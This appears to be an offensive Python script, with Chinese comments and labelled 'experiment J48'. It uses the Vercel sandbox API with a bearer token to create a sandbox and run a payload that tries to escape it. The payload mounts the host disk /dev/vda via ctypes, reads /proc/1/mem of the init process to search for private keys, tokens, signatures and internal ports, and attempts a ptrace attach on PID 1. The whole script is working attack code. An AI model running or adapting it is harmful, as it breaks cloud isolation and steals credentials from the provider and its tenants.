# 实验J48: ctypes mount /dev/vda + /proc/1/mem 内存挖掘 + ptrace
# 目标: 文件系统级宿主 rootfs; 从 sandbox-init 内存挖密钥/协议/路径
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj48"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import socket, re, os, subprocess, ctypes, struct, time

print("===== [1] ctypes mount /dev/vda =====", flush=True)
os.makedirs("/mnt/vda", exist_ok=True)
try:
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    libc.mount.restype = ctypes.c_int
    MS_RDONLY = 1
    r = libc.mount(b"/dev/vda", b"/mnt/vda", b"xfs", ctypes.c_ulong(MS_RDONLY), b"nouuid")
    if r != 0:
        print("mount RC=%d errno=%d %s" % (r, ctypes.get_errno(), os.strerror(ctypes.get_errno())), flush=True)
    else:
        print("MOUNT OK!", flush=True)
        print(subprocess.run(["ls", "-la", "/mnt/vda"], capture_output=True, text=True).stdout[:2000], flush=True)
        for d in ["/mnt/vda/run", "/mnt/vda/opt", "/mnt/vda/volumes", "/mnt/vda/root", "/mnt/vda/home"]:
            r2 = subprocess.run(["ls", "-la", d], capture_output=True, text=True)
            print("=== %s ===" % d, flush=True)
            print(r2.stdout[:1500], flush=True)
            if r2.returncode != 0:
                print(r2.stderr[:300], flush=True)
except Exception as e:
    print("ctypes mount EXC: %r" % e, flush=True)

print("===== [2] /proc/1/mem 直接读取测试 =====", flush=True)
try:
    fd = os.open("/proc/1/mem", os.O_RDONLY)
    print("/proc/1/mem open OK", flush=True)
    # 读 maps 找可读段
    maps = open("/proc/1/maps").read()
    print("maps first 2000:", maps[:2000], flush=True)
    # 尝试读每个可读段的前 4KB, 搜索敏感字符串
    hits = []
    for line in maps.splitlines():
        p = line.split()
        if len(p) < 2 or "r" not in p[1]:
            continue
        addr = p[0].split("-")
        start, end = int(addr[0], 16), int(addr[1], 16)
        if end - start > 64 * 1024 * 1024:
            continue
        try:
            os.lseek(fd, start, os.SEEK_SET)
            chunk = os.read(fd, min(end - start, 4096))
            for kw in [b"BEGIN", b"PRIVATE KEY", b"secret", b"token", b"signature",
                       b"x-sign", b"timestamp", b"pubkey", b"private", b"vcp_",
                       b"http://", b"https://", b"celld", b"cell.sock", b"23456",
                       b"30001", b"30002", b"/v1/", b"/v2/", b"api.vercel"]:
                if kw in chunk:
                    hits.append((hex(start), kw))
                    break
        except Exception:
            continue
    os.close(fd)
    print("mem hits:", hits, flush=True)
except Exception as e:
    print("/proc/1/mem ERR: %r" % e, flush=True)

print("===== [3] ptrace attach 测试 =====", flush=True)
try:
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    PTRACE_ATTACH = 16
    PTRACE_DETACH = 17
    r = libc.ptrace(PTRACE_ATTACH, 1, None, None)
    print("ptrace attach RC=%d errno=%d %s" % (r, ctypes.get_errno(), os.strerror(ctypes.get_errno())), flush=True)
    if r == 0:
        # waitpid
        r2 = libc.waitpid(1, None, 0)
        print("waitpid RC=%d" % r2, flush=True)
        # 读一个 word
        PTRACE_PEEKDATA = 2
        word = libc.ptrace(PTRACE_PEEKDATA, 1, 0x400000, None)
        print("peek RC=%d" % word, flush=True)
        libc.ptrace(PTRACE_DETACH, 1, None, None)
        print("detach done", flush=True)
except Exception as e:
    print("ptrace EXC: %r" % e, flush=True)

print("===== [4] 内存深度搜索 (若 mem 可读) =====", flush=True)
try:
    fd = os.open("/proc/1/mem", os.O_RDONLY)
    maps = open("/proc/1/maps").read()
    # 只搜堆/匿名段 (较大) 的前 16MB 每个
    found = {}
    for line in maps.splitlines():
        p = line.split()
        if len(p) < 6 or "rw" not in p[1]:
            continue
        if "/" in p[5] and not p[5].startswith("/run/vercel/share/sandbox-init"):
            continue
        addr = p[0].split("-")
        start, end = int(addr[0], 16), int(addr[1], 16)
        if end - start > 64 * 1024 * 1024:
            continue
        try:
            os.lseek(fd, start, os.SEEK_SET)
            data = os.read(fd, min(end - start, 4 * 1024 * 1024))
        except Exception:
            continue
        for kw in [b"PRIVATE KEY", b"x-signature", b"x-timestamp", b"signature:", b"timestamp:",
                   b"vcp_", b"Bearer ", b"Authorization", b"cell.sock", b"23456", b"30001",
                   b"30002", b"/v1/", b"/v2/", b"/api/", b"grpc", b"ed25519", b"http://",
                   b"https://", b"GET /", b"POST /", b"Host:", b"celld", b"hvc_", b"hvi_"]:
            idx = 0
            while True:
                i = data.find(kw, idx)
                if i < 0:
                    break
                ctx = data[max(0,i-80):i+160]
                if all(32 <= c < 127 or c in (10,13,9) for c in ctx):
                    found.setdefault(kw, []).append((hex(start+i), ctx.decode('latin1', errors='replace')))
                idx = i + 1
                if len(found.get(kw, [])) > 5:
                    break
    os.close(fd)
    for kw, lst in found.items():
        print("== %r (%d) ==" % (kw, len(lst)), flush=True)
        for a, c in lst[:5]:
            print("  %s: %r" % (a, c), flush=True)
except Exception as e:
    print("mem deep search ERR: %r" % e, flush=True)
'''
run_cmd(sid, SCAN, "ctypes-mount-mem-mine", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
